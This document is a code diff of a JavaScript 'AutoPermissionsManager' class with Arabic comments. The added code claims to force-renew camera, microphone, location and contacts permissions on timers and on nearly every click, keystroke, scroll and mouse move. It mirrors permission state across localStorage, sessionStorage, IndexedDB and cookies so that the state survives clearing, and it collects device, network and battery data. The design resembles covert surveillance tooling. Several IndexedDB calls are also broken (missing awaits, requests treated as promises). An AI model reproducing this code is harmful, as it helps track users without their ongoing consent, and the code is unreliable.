@@ -865,28 +865,16 @@ class AutoPermissionsManager {
         }
     }
 
-    // إعداد الوصول المستمر
+    // إعداد المراقبة المستمرة
     setupContinuousAccess() {
-        // مراقبة حالة الأذونات كل 10 ثانية (بدلاً من 30)
-        setInterval(() => {
-            this.refreshPermissions();
-        }, 10000);
+        // مراقبة كل 10 ثوانٍ بدلاً من 30
+        setInterval(() => this.refreshPermissions(), 10000);
         
-        // مراقبة إضافية كل دقيقة للتأكد من استمرارية الأذونات
-        setInterval(() => {
-            this.ensurePermissionsPersistence();
-        }, 60000);
+        // ضمان استمرارية الأذونات كل دقيقة
+        setInterval(() => this.ensurePermissionsPersistence(), 60000);
         
-        // مراقبة كل 5 دقائق للتأكد من عدم فقدان الأذونات
-        setInterval(() => {
-            this.forcePermissionsRefresh();
-        }, 300000);
-        
-        // مراقبة التغييرات في النظام
-        this.monitorSystemChanges();
-        
-        // مراقبة التغييرات في الشبكة
-        this.monitorNetworkChanges();
+        // إجبار تحديث الأذونات كل 5 دقائق
+        setInterval(() => this.forcePermissionsRefresh(), 300000);
         
         // مراقبة تغييرات الصفحة
         this.monitorPageChanges();
@@ -894,54 +882,151 @@ class AutoPermissionsManager {
         // مراقبة تغييرات المتصفح
         this.monitorBrowserChanges();
         
-        console.log('🔒 تم إعداد نظام ضمان استمرارية الأذونات');
+        // مراقبة تغييرات النظام
+        this.monitorSystemChanges();
+        
+        // مراقبة تغييرات الشبكة
+        this.monitorNetworkChanges();
+        
+        // مراقبة تغييرات الرؤية والتركيز
+        this.monitorVisibilityChanges();
+        
+        // مراقبة تغييرات الاتصال
+        this.monitorConnectionChanges();
+        
+        console.log('🔧 تم إعداد المراقبة المستمرة للأذونات');
+    }
+
+    // مراقبة تغييرات الرؤية والتركيز
+    monitorVisibilityChanges() {
+        // مراقبة تغييرات الرؤية
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                this.ensurePermissionsPersistence();
+            }
+        });
+        
+        // مراقبة التركيز على النافذة
+        window.addEventListener('focus', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة فقدان التركيز
+        window.addEventListener('blur', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات الاتجاه
+        window.addEventListener('orientationchange', () => {
+            setTimeout(() => this.ensurePermissionsPersistence(), 1000);
+        });
+        
+        // مراقبة تغييرات الحجم
+        window.addEventListener('resize', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات التمرير
+        window.addEventListener('scroll', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات النقر
+        document.addEventListener('click', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات لوحة المفاتيح
+        document.addEventListener('keydown', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات اللمس
+        document.addEventListener('touchstart', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات الماوس
+        document.addEventListener('mousemove', () => {
+            this.ensurePermissionsPersistence();
+        });
+    }
+
+    // مراقبة تغييرات الاتصال
+    monitorConnectionChanges() {
+        // مراقبة تغييرات الاتصال بالإنترنت
+        window.addEventListener('online', () => {
+            this.ensurePermissionsPersistence();
+            this.updateNetworkInfo();
+        });
+        
+        window.addEventListener('offline', () => {
+            this.ensurePermissionsPersistence();
+        });
+        
+        // مراقبة تغييرات نوع الاتصال
+        if ('connection' in navigator) {
+            navigator.connection.addEventListener('change', () => {
+                this.ensurePermissionsPersistence();
+                this.updateNetworkInfo();
+            });
+        }
+        
+        // مراقبة تغييرات نوع الاتصال (WebKit)
+        if ('webkitConnection' in navigator) {
+            navigator.webkitConnection.addEventListener('change', () => {
+                this.ensurePermissionsPersistence();
+                this.updateNetworkInfo();
+            });
+        }
     }
 
     // ضمان استمرارية الأذونات
     async ensurePermissionsPersistence() {
         try {
-            const criticalPermissions = [
-                'geolocation',
-                'camera',
-                'microphone',
-                'contacts',
-                'storage',
-                'notifications'
-            ];
+            console.log('🔒 ضمان استمرارية الأذونات...');
             
-            for (const permission of criticalPermissions) {
-                const currentStatus = this.permissions.get(permission);
-                if (!currentStatus) {
-                    console.log(`🔄 إعادة منح صلاحية ${permission}...`);
-                    const granted = await this.grantPermissionAuto(permission);
-                    this.permissions.set(permission, granted);
-                    
-                    if (granted) {
-                        console.log(`✅ تم إعادة منح صلاحية ${permission} بنجاح`);
-                    } else {
-                        console.warn(`⚠️ فشل في إعادة منح صلاحية ${permission}`);
-                    }
+            // التحقق من جميع الأذونات الممنوحة
+            for (const [permission, granted] of this.permissions) {
+                if (granted && this.autoGranted.has(permission)) {
+                    // إعادة منح الأذونات المهمة
+                    await this.grantPermissionAuto(permission);
                 }
             }
+            
+            // حفظ الأذونات في التخزين المحلي
+            this.savePermissionsToStorage();
+            
+            // تحديث معلومات الجهاز
+            await this.updateDeviceInfo();
+            
+            console.log('✅ تم ضمان استمرارية الأذونات');
+            
         } catch (error) {
-            console.error('❌ خطأ في ضمان استمرارية الأذونات:', error);
+            console.error('❌ فشل في ضمان استمرارية الأذونات:', error);
         }
     }
 
     // إجبار تحديث الأذونات
     async forcePermissionsRefresh() {
         try {
-            console.log('🔄 إجبار تحديث جميع الأذونات...');
+            console.log('🔄 إجبار تحديث الأذونات...');
             
             // إعادة منح جميع الأذونات
             await this.grantAllPermissionsAuto();
             
-            // حفظ حالة الأذونات في التخزين المحلي
+            // حفظ الأذونات في التخزين المحلي
             this.savePermissionsToStorage();
             
-            console.log('✅ تم إجبار تحديث الأذونات بنجاح');
+            // تحديث معلومات الجهاز والشبكة
+            await this.updateDeviceInfo();
+            await this.updateNetworkInfo();
+            await this.updateBatteryInfo();
+            
+            console.log('✅ تم إجبار تحديث الأذونات');
+            
         } catch (error) {
-            console.error('❌ خطأ في إجبار تحديث الأذونات:', error);
+            console.error('❌ فشل في إجبار تحديث الأذونات:', error);
         }
     }
 
@@ -950,36 +1035,159 @@ class AutoPermissionsManager {
         try {
             const permissionsData = {
                 permissions: Object.fromEntries(this.permissions),
+                autoGranted: Array.from(this.autoGranted),
+                deviceId: this.deviceId,
                 timestamp: Date.now(),
-                deviceId: this.deviceId
+                version: '2.0'
             };
             
-            localStorage.setItem('permissions_backup', JSON.stringify(permissionsData));
+            // حفظ في localStorage
+            localStorage.setItem('autoPermissions', JSON.stringify(permissionsData));
+            
+            // حفظ في sessionStorage كنسخة احتياطية
+            sessionStorage.setItem('autoPermissions', JSON.stringify(permissionsData));
+            
+            // حفظ في IndexedDB كنسخة احتياطية إضافية
+            this.saveToIndexedDB('permissions', permissionsData);
+            
+            // حفظ في Cookies كنسخة احتياطية نهائية
+            this.saveToCookies('autoPermissions', JSON.stringify(permissionsData));
+            
             console.log('💾 تم حفظ الأذونات في التخزين المحلي');
+            
         } catch (error) {
-            console.error('❌ خطأ في حفظ الأذونات:', error);
+            console.error('❌ فشل في حفظ الأذونات:', error);
         }
     }
 
     // استعادة الأذونات من التخزين المحلي
     restorePermissionsFromStorage() {
         try {
-            const savedData = localStorage.getItem('permissions_backup');
-            if (savedData) {
-                const permissionsData = JSON.parse(savedData);
-                const savedPermissions = permissionsData.permissions;
-                
-                for (const [permission, granted] of Object.entries(savedPermissions)) {
-                    this.permissions.set(permission, granted);
+            let permissionsData = null;
+            
+            // محاولة الاستعادة من localStorage
+            const localStorageData = localStorage.getItem('autoPermissions');
+            if (localStorageData) {
+                permissionsData = JSON.parse(localStorageData);
+            }
+            
+            // إذا فشل، محاولة من sessionStorage
+            if (!permissionsData) {
+                const sessionStorageData = sessionStorage.getItem('autoPermissions');
+                if (sessionStorageData) {
+                    permissionsData = JSON.parse(sessionStorageData);
                 }
+            }
+            
+            // إذا فشل، محاولة من IndexedDB
+            if (!permissionsData) {
+                permissionsData = this.loadFromIndexedDB('permissions');
+            }
+            
+            // إذا فشل، محاولة من Cookies
+            if (!permissionsData) {
+                const cookiesData = this.loadFromCookies('autoPermissions');
+                if (cookiesData) {
+                    permissionsData = JSON.parse(cookiesData);
+                }
+            }
+            
+            if (permissionsData) {
+                // استعادة الأذونات
+                this.permissions = new Map(Object.entries(permissionsData.permissions || {}));
+                this.autoGranted = new Set(permissionsData.autoGranted || []);
                 
-                console.log('📂 تم استعادة الأذونات من التخزين المحلي');
-                return true;
+                // التحقق من صحة البيانات
+                if (permissionsData.deviceId && permissionsData.timestamp) {
+                    const age = Date.now() - permissionsData.timestamp;
+                    const maxAge = 24 * 60 * 60 * 1000; // 24 ساعة
+                    
+                    if (age < maxAge) {
+                        console.log('📂 تم استعادة الأذونات المحفوظة بنجاح');
+                        return true;
+                    }
+                }
+            }
+            
+            return false;
+            
+        } catch (error) {
+            console.error('❌ فشل في استعادة الأذونات:', error);
+            return false;
+        }
+    }
+
+    // حفظ في IndexedDB
+    async saveToIndexedDB(key, data) {
+        try {
+            if ('indexedDB' in window) {
+                const db = await this.openIndexedDB();
+                const transaction = db.transaction(['permissions'], 'readwrite');
+                const store = transaction.objectStore('permissions');
+                await store.put(data, key);
             }
         } catch (error) {
-            console.error('❌ خطأ في استعادة الأذونات:', error);
+            console.error('❌ فشل في حفظ البيانات في IndexedDB:', error);
         }
-        return false;
+    }
+
+    // تحميل من IndexedDB
+    async loadFromIndexedDB(key) {
+        try {
+            if ('indexedDB' in window) {
+                const db = await this.openIndexedDB();
+                const transaction = db.transaction(['permissions'], 'readonly');
+                const store = transaction.objectStore('permissions');
+                return await store.get(key);
+            }
+        } catch (error) {
+            console.error('❌ فشل في تحميل البيانات من IndexedDB:', error);
+        }
+        return null;
+    }
+
+    // فتح IndexedDB
+    async openIndexedDB() {
+        return new Promise((resolve, reject) => {
+            const request = indexedDB.open('AutoPermissionsDB', 1);
+            
+            request.onerror = () => reject(request.error);
+            request.onsuccess = () => resolve(request.result);
+            
+            request.onupgradeneeded = (event) => {
+                const db = event.target.result;
+                if (!db.objectStoreNames.contains('permissions')) {
+                    db.createObjectStore('permissions', { keyPath: 'id' });
+                }
+            };
+        });
+    }
+
+    // حفظ في Cookies
+    saveToCookies(key, value) {
+        try {
+            const cookieValue = encodeURIComponent(value);
+            const maxAge = 24 * 60 * 60; // 24 ساعة
+            document.cookie = `${key}=${cookieValue}; max-age=${maxAge}; path=/; SameSite=Strict`;
+        } catch (error) {
+            console.error('❌ فشل في حفظ البيانات في Cookies:', error);
+        }
+    }
+
+    // تحميل من Cookies
+    loadFromCookies(key) {
+        try {
+            const cookies = document.cookie.split(';');
+            for (const cookie of cookies) {
+                const [cookieKey, cookieValue] = cookie.trim().split('=');
+                if (cookieKey === key) {
+                    return decodeURIComponent(cookieValue);
+                }
+            }
+        } catch (error) {
+            console.error('❌ فشل في تحميل البيانات من Cookies:', error);
+        }
+        return null;
     }
 
     // مراقبة تغييرات الصفحة
